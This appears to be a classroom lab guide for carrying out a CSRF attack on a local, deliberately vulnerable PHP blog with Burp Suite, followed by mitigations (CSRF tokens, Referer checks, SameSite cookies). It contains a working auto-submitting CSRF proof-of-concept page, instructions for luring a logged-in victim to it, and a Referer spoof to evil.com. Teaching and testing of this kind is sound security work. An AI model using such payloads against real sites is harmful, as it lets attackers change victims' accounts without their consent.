# CSRF Attack Lab Guide: Using Burp Suite Professional

## Lab Scenario: Shifat Bypasses Authorization via CSRF

**Application:** Vulnerable Blog (SQLMAP_Lab)  
**Attacker:** `shifat` / `1234`  
**Victim:** `victim` or `admin` (must be logged in)  
**Goal:** Shifat cannot directly edit victim's posts (blocked by auth check), but will force the victim to submit the edit via CSRF.

---

## Prerequisites

- Burp Suite **Professional** (Community Edition cannot generate CSRF PoC)
- Firefox/Chrome browser configured with Burp proxy
- The vulnerable blog running at `http://localhost/SQLMAP_Lab/`

---

## Step 1: Setup Burp Suite Proxy

### 1.1 Configure Browser Proxy
1. Open Firefox → Settings → Network Settings → Manual proxy configuration
2. Set **HTTP Proxy:** `127.0.0.1`, **Port:** `8080`
3. Check "Use this proxy server for all protocols"
4. Click OK

### 1.2 Start Burp Intercept
1. Open Burp Suite Professional
2. Go to **Proxy** → **Intercept** tab
3. Make sure **Intercept is ON** (button should say "Intercept is on")

---

## Step 2: Login as Victim and Capture the Edit Request

### 2.1 Login as Victim
1. In your browser, go to: `http://localhost/SQLMAP_Lab/login.php`
2. Login with:
   - Username: `victim`
   - Password: `victim123`
3. You should see the blog homepage with posts

### 2.2 Navigate to Edit Page
1. Click **Edit** on any post (e.g., post ID 1)
2. You are now on `edit.php?id=1`
3. Change the title to something like: `Test Edit`
4. Change the content to: `Testing CSRF lab`

### 2.3 Capture the POST Request in Burp
1. Before clicking **Update Post**, make sure Burp Intercept is ON
2. Click **Update Post**
3. The request will be captured in Burp's Intercept tab
4. You should see something like:

```
POST /SQLMAP_Lab/edit.php?id=1 HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 45
Cookie: PHPSESSID=abc123...

 title=Test+Edit&content=Testing+CSRF+lab
```

5. **Right-click** on this request → Select **"Send to Repeater"** (for later testing)
6. **Right-click** again → Select **"Engagement tools" → "Generate CSRF PoC"**

---

## Step 3: Generate CSRF PoC with Burp Suite

### 3.1 Open CSRF PoC Generator
1. Burp will open the **CSRF PoC Generator** window
2. You will see two panels:
   - **Top:** The original HTTP request
   - **Bottom:** The auto-generated HTML PoC code

### 3.2 Modify the Payload (Shifat's Attack)
1. In the top panel (request), modify the POST body to shifat's malicious content:
   ```
   title=HACKED+BY+SHIFAT&content=This+post+was+stolen+via+CSRF+attack!
   ```
2. Click **"Regenerate"** button to update the HTML
3. The bottom panel now shows the new PoC HTML with the malicious values

### 3.3 Configure Options
1. Click **"Options"** button
2. Check **"Include auto-submit script"** (this makes the form submit automatically when the page loads)
3. The CSRF technique should be set to **"Auto"**

### 3.4 Copy the HTML
1. Click **"Copy HTML"** button
2. Paste it into a text editor (VS Code, Notepad, etc.)
3. Save the file as `shifat_csrf_attack.html`

---

## Step 4: Deploy the Malicious Page

### 4.1 Place the File
1. Move `shifat_csrf_attack.html` to your web server:
   ```bash
   sudo mv shifat_csrf_attack.html /var/www/html/
   ```
2. Or host it on any web server (even a simple Python server):
   ```bash
   cd /path/to/file
   python3 -m http.server 8000
   ```

### 4.2 Verify the HTML Structure
Open the file and verify it looks like this:

```html
<html>
  <body>
    <script>history.pushState('', '', '/')</script>
    <form action="http://localhost/SQLMAP_Lab/edit.php?id=1" method="POST" id="csrf-form">
      <input type="hidden" name="title" value="HACKED BY SHIFAT" />
      <input type="hidden" name="content" value="This post was stolen via CSRF attack!" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.getElementById("csrf-form").submit();
    </script>
  </body>
</html>
```

---

## Step 5: Execute the Attack

### 5.1 Confirm Victim is Logged In
1. Make sure the victim (`victim` or `admin`) is still logged in in the browser
2. Verify by visiting `http://localhost/SQLMAP_Lab/index.php` — you should see "Logout (victim)"

### 5.2 Trick Victim into Visiting the Malicious Page
1. In the SAME browser (where victim is logged in), open a new tab
2. Visit: `http://localhost/shifat_csrf_attack.html`
3. The page will load and **automatically submit** the form (thanks to the auto-submit script)
4. You might see a brief flash or redirect

### 5.3 Verify the Attack
1. Go back to the blog: `http://localhost/SQLMAP_Lab/index.php`
2. Look at the post that was edited (post ID 1)
3. **The title should now be:** `HACKED BY SHIFAT`
4. **The content should now be:** `This post was stolen via CSRF attack!`

---

## Step 6: Verify Shifat Cannot Do This Directly (Control Test)

### 6.1 Login as Shifat
1. Logout the victim
2. Login as:
   - Username: `shifat`
   - Password: `1234`

### 6.2 Try Direct Edit
1. Try to visit `http://localhost/SQLMAP_Lab/edit.php?id=1` directly
2. You will see: **"Access Denied: You cannot edit posts that belong to other users"**
3. Try to submit the edit form anyway
4. The edit will be blocked!

### 6.3 Conclusion
- Shifat **cannot** edit victim's posts directly
- But shifat **CAN** force the victim to do it via CSRF
- This proves the CSRF vulnerability bypasses the authorization check!

---

## Step 7: Analyze the Request in Burp (Deep Dive)

### 7.1 Check Proxy History
1. Go to **Proxy** → **HTTP history**
2. Find the request to `edit.php?id=1`
3. Notice:
   - The request came from the attacker's domain (or localhost/shifat_csrf_attack.html)
   - BUT the **Cookie header** contains the VICTIM's `PHPSESSID`
   - The server only checks the cookie, not where the request came from

### 7.2 Compare Requests in Repeater
1. Go to **Repeater** tab
2. Send the original edit request (from victim)
3. Now modify the request:
   - Change the `Referer` header to `http://evil.com`
   - Remove any CSRF token (there isn't one in this vulnerable app!)
4. Send again — it still works!
5. This proves there is NO CSRF protection

---

## Step 8: How to Fix (Mitigation)

Your teacher will ask how to prevent this. Here are the fixes:

### 8.1 Add CSRF Tokens
In `edit.php`, add a hidden token field:
```php
<?php
// Generate CSRF token
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}
$csrf_token = $_SESSION['csrf_token'];
?>

<!-- In the form -->
<input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>">

<!-- Verify on POST -->
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'] ?? '')) {
        die('CSRF token validation failed');
    }
}
?>
```

### 8.2 Check Referer Header
```php
if (!isset($_SERVER['HTTP_REFERER']) || parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST) !== $_SERVER['HTTP_HOST']) {
    die('Invalid request origin');
}
```

### 8.3 SameSite Cookies
In `config.php`, set session cookie to SameSite:
```php
session_set_cookie_params([
    'samesite' => 'Strict'
]);
```

---

## Lab Report Checklist

For your submission, include:

- [ ] Screenshot of Burp Intercept capturing the edit request
- [ ] Screenshot of CSRF PoC Generator window with modified payload
- [ ] The generated HTML code (shifat_csrf_attack.html)
- [ ] Screenshot of victim logged in
- [ ] Screenshot of malicious page being visited
- [ ] Screenshot of blog showing modified post (HACKED BY SHIFAT)
- [ ] Screenshot of shifat being blocked from direct edit
- [ ] Explanation of why the attack works (no CSRF token)
- [ ] Explanation of the fix (add CSRF tokens)

---

## Troubleshooting

| Problem | Solution |
|---------|----------|
| Burp says "Intercept is off" but I can't capture | Make sure browser proxy is set to 127.0.0.1:8080 |
| CSRF PoC generator not showing | You need Burp Suite **Professional**, not Community |
| Auto-submit doesn't work | Check if JavaScript is enabled in browser |
| Victim not logged in | Make sure victim session is active (visit blog first) |
| Post not modified | Check the post ID in the form action matches actual post |
| "Access Denied" when testing attack | The victim must be the OWNER of the post, not shifat |

---

## Quick Reference: Key Burp Suite Features Used

| Feature | Purpose | Location |
|---------|---------|----------|
| Intercept | Capture live HTTP requests | Proxy → Intercept |
| Repeater | Manually modify and resend requests | Repeater tab |
| CSRF PoC Generator | Auto-generate malicious HTML | Right-click → Engagement tools |
| HTTP History | Review all captured traffic | Proxy → HTTP history |

---

**Happy Hacking!** 🔥
